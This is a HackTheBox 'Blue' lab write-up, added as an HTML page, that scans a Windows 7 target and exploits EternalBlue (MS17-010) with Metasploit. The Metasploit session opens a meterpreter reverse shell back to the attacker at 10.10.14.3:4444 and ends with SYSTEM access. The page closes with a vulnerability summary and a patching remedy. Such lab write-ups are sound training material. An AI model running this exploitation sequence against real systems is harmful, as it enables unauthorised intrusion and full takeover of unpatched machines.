@@ -1,0 +1,420 @@
+
+  
+    
+    <title>
+      HackTheBox - Blue (Easy)
+    </title>
+    
+  
+  
+    
+      <header>
+<div class="header"><img src="https://www.notion.so/images/page-cover/solid_blue.png" class="headerImage"/>
+<img class="headerIcon" src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Blue/icon.png"/>
+<h1 class="mainTitle">
+          HackTheBox - Blue (Easy)
+        </h1 class="mainTitle">
+</div></header>
+      <div class="writeUp">
+        <h1 id="6fa6e275-4f5f-4b5b-af86-2e43bae3d349">
+          Table of contents
+        </h1>
+        <nav id="c5714f75-995a-4a96-96e8-6290d16dc42a">
+          <div>
+            <a href="#6fa6e275-4f5f-4b5b-af86-2e43bae3d349">
+              Table of contents
+            </a>
+          </div>
+          <div>
+            <a href="#2f70f235-e118-422d-873f-a1588d39d1a2">
+              Enumeration
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#ab04c1ec-6793-4d83-9484-1a917b932f68">
+              
+                Nmap scan
+              
+            </a>
+          </div>
+          <div>
+            <a href="#cb5105f8-186f-455c-9aca-c40f8c906934">
+              Initial access
+            </a>
+          </div>
+          <div>
+            <a href="#59656b1d-2d20-493c-9b2f-b0410ed10ebc">
+              Vulnerabilities summary
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#63b4ac22-63c5-4bba-9936-4bb58405ceda">
+              
+                EternalBlue (MS17-010)
+              
+            </a>
+          </div>
+          <div>
+            <a href="#1a7693fa-4324-4f22-9c0d-a74393b00769">
+              Tools used
+            </a>
+          </div>
+          <div>
+            <a href="#272d3564-c8e7-47bf-b077-3521ee489b91">
+              Sources
+            </a>
+          </div>
+        </nav>
+        <h1 id="2f70f235-e118-422d-873f-a1588d39d1a2">
+          Enumeration
+        </h1>
+        <h2 id="ab04c1ec-6793-4d83-9484-1a917b932f68">
+          
+            Nmap scan
+          
+        </h2>
+        
+        
+        
+<pre id="e958c0cf-2868-4daf-b42b-1c5d93aa9d12" class="code"><code># Nmap 7.93 scan initiated Thu Jun 15 20:19:46 2023 as: nmap -A -p- -oN nmapResults.txt -T5 -v 10.10.10.40
+Warning: 10.10.10.40 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.10.40
+Host is up (0.027s latency).
+Not shown: 65521 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE      VERSION
+135/tcp   open     msrpc        Microsoft Windows RPC
+139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open     microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+16634/tcp filtered unknown
+34014/tcp filtered unknown
+38079/tcp filtered unknown
+49152/tcp open     msrpc        Microsoft Windows RPC
+49153/tcp open     msrpc        Microsoft Windows RPC
+49154/tcp open     msrpc        Microsoft Windows RPC
+49155/tcp open     msrpc        Microsoft Windows RPC
+49156/tcp open     msrpc        Microsoft Windows RPC
+49157/tcp open     msrpc        Microsoft Windows RPC
+58414/tcp filtered unknown
+64464/tcp filtered unknown
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-06-16T00:21:19
+|_  start_date: 2023-06-16T00:18:33
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-06-16T01:21:16+01:00
+|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jun 15 20:21:23 2023 -- 1 IP address (1 host up) scanned in 96.95 seconds</code></pre>
+        <p id="d759b376-5520-4e69-8680-041fb9c12883">
+          We can notice that ports 
+          
+            
+              139
+            
+          
+           and 
+          
+            
+              445
+            
+          
+           are open, and that the target is running 
+          
+            
+              Windows 7 Professional
+            
+          
+          .
+        </p>
+        <h1 id="cb5105f8-186f-455c-9aca-c40f8c906934">
+          Initial access
+        </h1>
+        <p id="211dc221-f9cd-4ae5-82ac-9da961053a21">
+          
+            
+              Windows 7 Professional
+            
+          
+           may be vulnerable to 
+          
+            EternalBlue
+          
+          . We can use 
+          <a href="https://www.metasploit.com/">
+            
+              Metasploit Framework
+            
+          </a>
+           to exploit this vulnerability : 
+        </p>
+        
+        
+        
+<pre id="0f32689b-aa91-4112-b8d1-458d9f7ef3b1" class="code"><code>msf6 &gt; search Eternalblue
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+msf6 &gt; use 0
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40
+RHOSTS =&gt; 10.10.10.40
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.3:4444 
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.10.40:445 - The target is vulnerable.
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.40:445 - Starting non-paged pool grooming
+[+] 10.10.10.40:445 - Sending SMBv2 buffers
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.40:445 - Receiving response from exploit packet
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200774 bytes) to 10.10.10.40
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Meterpreter session 1 opened (10.10.14.3:4444 -&gt; 10.10.10.40:49158) at 2023-06-15 20:28:41 -0400
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM</code></pre>
+        <p id="16c0f07f-dcfa-4a9d-a01c-3b287a9c4187">
+          Now we have a shell as 
+          <code>
+            NT AUTHORITY\SYSTEM
+          </code>
+          , so we have full control over the target.
+        </p>
+        <h1 id="59656b1d-2d20-493c-9b2f-b0410ed10ebc">
+          Vulnerabilities summary
+        </h1>
+        <h2 id="63b4ac22-63c5-4bba-9936-4bb58405ceda">
+          
+            EternalBlue (MS17-010)
+          
+        </h2>
+        <table id="c2a8f61b-fb64-4077-b1d1-ce3ec143c225">
+          <thead>
+            <tr id="67a8ee5c-9e94-45ec-a64d-db49c7d7ca25">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="e9d706b5-f25e-4da9-b748-00e7b2077b67">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                SMB service
+              </td>
+            </tr>
+            <tr id="1cefebd2-1351-4fa6-81fc-4518a154cc5d">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  9.8
+                
+              </td>
+            </tr>
+            <tr id="28ddc5d2-d1a3-4099-a1bd-3c1d7206007e">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  CRITICAL
+                
+              </td>
+            </tr>
+            <tr id="8ad17971-cb1b-471e-a1f6-5be0820d5429">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="4634b68d-1d40-47cb-a3d8-b300b523e027">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to execute arbitrary code as 
+                
+                  
+                    NT AUTHORITY\SYSTEM
+                  
+                
+                . This could allow an attacker to gain a shell with full control over the system.
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    integrity
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    confidentiality
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability 
+                  
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="f933731c-df09-4ead-af62-763c7cdd0216">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Update the system through 
+                
+                  
+                    Windows Update
+                  
+                
+                .
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="1a7693fa-4324-4f22-9c0d-a74393b00769">
+          Tools used
+        </h1>
+        <table id="450236ca-0b83-41c4-bff7-87ad94cfca56">
+          <thead>
+            <tr id="ed9ef58a-bce5-4c97-bb54-d0275f302a65">
+              <th id="`&gt;MF">
+                Tool
+              </th>
+              <th id="A|qY">
+                Purpose
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="63265d93-4247-420e-a3d1-62d9e6a64ffe">
+              <td id="`&gt;MF">
+                <a href="https://nmap.org/book/man.html">
+                  Nmap
+                </a>
+              </td>
+              <td id="A|qY">
+                - Scan for open ports
+                
+                - Scan services versions
+                
+              </td>
+            </tr>
+            <tr id="4c1d296d-b811-4cd6-acfe-9cf6effef21a">
+              <td id="`&gt;MF">
+                <a href="https://www.metasploit.com/">
+                  Metasploit Framework
+                </a>
+              </td>
+              <td id="A|qY">
+                - Run exploits against the target system
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="272d3564-c8e7-47bf-b077-3521ee489b91">
+          Sources
+        </h1>
+        <ul id="5720afed-ec91-4349-9ea8-69633a02f5ca">
+          <li>
+            EternalBlue wikipedia article : 
+            <a href="https://fr.wikipedia.org/wiki/EternalBlue">
+              https://fr.wikipedia.org/wiki/EternalBlue
+            </a>
+          </li>
+        </ul>
+        <ul id="7f831af9-4537-4dca-b561-5ad284fd44bf">
+          <li>
+            EternalBlue NIST NVD page : 
+            <a href="https://nvd.nist.gov/vuln/detail/cve-2017-0144">
+              https://nvd.nist.gov/vuln/detail/cve-2017-0144
+            </a>
+          </li>
+        </ul>
+      </div>
+    
+    <span>
+    </span>
+  
+
